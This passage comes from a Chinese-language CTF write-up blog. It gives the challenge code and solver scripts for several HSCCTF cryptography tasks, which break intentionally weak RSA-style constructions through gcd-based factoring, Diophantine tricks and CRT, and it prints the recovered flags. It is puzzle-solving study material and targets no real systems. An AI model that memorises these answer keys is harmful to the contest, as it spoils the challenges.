gcd(n[i],n[j]) != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,j)</span><br><span class="line">            </span><br><span class="line">p = gcd(n[<span class="number">4</span>],n[<span class="number">5</span>])</span><br><span class="line">q = n[<span class="number">4</span>] // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c[<span class="number">4</span>],d,n[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;this_1s_yi_zhi_xiao_jiu_li&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZ-MATH"><a href="#EZ-MATH" class="headerlink" title="EZ_MATH"></a>EZ_MATH</h3><blockquote><p>就是数学,学吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*****************************************&#125;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag.encode())</span><br><span class="line">y = getPrime(<span class="number">200</span>)</span><br><span class="line">z = getPrime(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span> (x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) == jl + <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = jl + <span class="number">2024</span></span><br><span class="line">b = jl + <span class="number">2025</span></span><br><span class="line">c = getPrime(<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">assert</span> w*(a*c + b*c - a*b) == <span class="number">4</span>*a*b*c</span><br></pre></td></tr></table></figure></blockquote><p>$w(ac + bc - ab) = 4abc \Longrightarrow \cfrac{4}{w} = \cfrac{1}{a} + \cfrac{1}{b} - \cfrac{1}{c}$</p><p>著名丢番图方程，参考 <a href="https://scialert.net/fulltext/?doi=aja.2011.31.37#:~:text=The%20above%20relation%20can%20also,this%20is%20a%20Diophantine%20equation">这篇论文</a> 有 $a=\cfrac{w-1}{2},b=\cfrac{w+1}{2}$，故而得到 $jl$。</p><p>又 $jl=(x^2+1)(y^2+1)(z^2+1) + 4[(xyz)(x+y+z)+(xy+xz+yz)] - 2(x+y+z+xyz)(xy+yz+xz+1)=(x-1)^2(y-1)^2(z-1)^2$，</p><p>求出 $\sqrt{jl}$ 的所有因子，根据 $x,y,z$ 的位数限制，爆破即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x,y,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">f=(x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) - <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(f.factor())</span><br><span class="line"></span><br><span class="line"><span class="comment">#(z - 1)^2 * (y - 1)^2 * (x - 1)^2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = (w-<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">b = (w+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">jl = a-<span class="number">2024</span></span><br><span class="line">s = jl.nth_root(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">sf = divisors(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sf))</span><br><span class="line"></span><br><span class="line">yz = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sf)):</span><br><span class="line">    t = sf[i]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">199</span> <span class="keyword">and</span> t &lt; <span class="number">2</span>^<span class="number">200</span> <span class="keyword">and</span> is_prime(t):</span><br><span class="line">        yz.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(yz)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(yz)):</span><br><span class="line">        x = long_to_bytes(s // ((yz[i]-<span class="number">1</span>)*(yz[j]-<span class="number">1</span>)) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x.isascii():</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;HSCCTF&#123;math_is_good&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SIGN-IN"><a href="#SIGN-IN" class="headerlink" title="SIGN_IN"></a>SIGN_IN</h3><blockquote><p>这是签到题啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;66666666666666666666666666666666666&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">g, r1, r2, k1, k2 = [randint(<span class="number">1</span>, n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">g1 = powmod(g, r1 * (p - <span class="number">1</span>), n)</span><br><span class="line">g2 = powmod(g, r2 * (q - <span class="number">1</span>), n)</span><br><span class="line">c1 = m * powmod(g1, k1, n) % n</span><br><span class="line">c2 = m * powmod(g2, k2, n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc=&#x27;</span>, [c1, c2])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n, g1, g1=&#x27;</span>, [n, g1, g2])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">enc= [15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744, 6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343]</span></span><br><span class="line"><span class="string">n, g1, g1= [20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101, 13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764, 16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a href="https://blog.csdn.net/weixin_44017838/article/details/105459003">V&amp;N2020 - Fast</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c1,c2 = [<span class="number">15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744</span>, <span class="number">6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343</span>]</span><br><span class="line">n, g1, g2= [<span class="number">20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101</span>, <span class="number">13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764</span>, <span class="number">16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427</span>]</span><br><span class="line"></span><br><span class="line">p = gcd(g1-<span class="number">1</span>,n)</span><br><span class="line">q = gcd(g2-<span class="number">1</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br><span class="line"></span><br><span class="line">m = crt([c1%p,c2%q],[p,q])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Any_restr1ct1ons_all_begins_with_his_own_heart&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MIXED"><a href="#MIXED" class="headerlink" title="MIXED"></a>MIXED</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">n1 = q * p1</span><br><span class="line">n2 = p * q1</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">h0 = <span class="built_in">pow</span>(<span class="number">2023</span> * p + <span class="number">2024</span>, q1, n2)</span><br><span class="line">h1 = <span class="built_in">pow</span>(<span class="number">2024</span> * p1 + <span class="number">2023</span> * q, <span class="number">114</span>, n1)</span><br><span class="line">h2 = <span class="built_in">pow</span>(<span class="number">2023</span> * p1 + <span class="number">2024</span> * q, <span class="number">514</span>, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h0 = <span class="subst">&#123;h0&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h1 = <span class="subst">&#123;h1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h2 = <span class="subst">&#123;h2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 = 14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line"><span class="comment"># n2 = 17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line"><span class="comment"># c = 13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line"><span class="comment"># h0 = 5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line"><span class="comment"># h1 = 12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line"><span class="comment"># h2 = 10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a href="https://blog.csdn.net/Luiino/article/details/128509343">东华杯 - fermat’s revenge</a> 和 <a href="https://blog.csdn.net/qq_52193383/article/details/120317438">GKCTF 2021 - RRRRsa</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line">n2 = <span class="number">17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line">c = <span class="number">13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line">h0 = <span class="number">5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line">h1 = <span class="number">12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line">h2 = <span class="number">10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">h1x = <span class="built_in">pow</span>(h1 * <span class="built_in">pow</span>(<span class="number">2023</span>,<span class="number">114</span>,n1),<span class="number">514</span>,n1)</span><br><span class="line">h2x = <span class="built_in">pow</span>(h2 * <span class="built_in">pow</span>(<span class="number">2024</span>,<span class="number">514</span>,n1),<span class="number">114</span>,n1)</span><br><span class="line">q = gcd(h2x-h1x,n1)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">kp = h0-<span class="built_in">pow</span>(<span class="number">2024</span>,n2,n2)</span><br><span class="line">p = gcd(n2,kp)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;hscctf&#123;35d7ecc2-6216-4f09-b052-3de921f170b6&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="YOUQU"><a href="#YOUQU" class="headerlink" title="YOUQU"></a>YOUQU</h3><blockquote><p>出题人很有趣,给你函数了直接解吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = 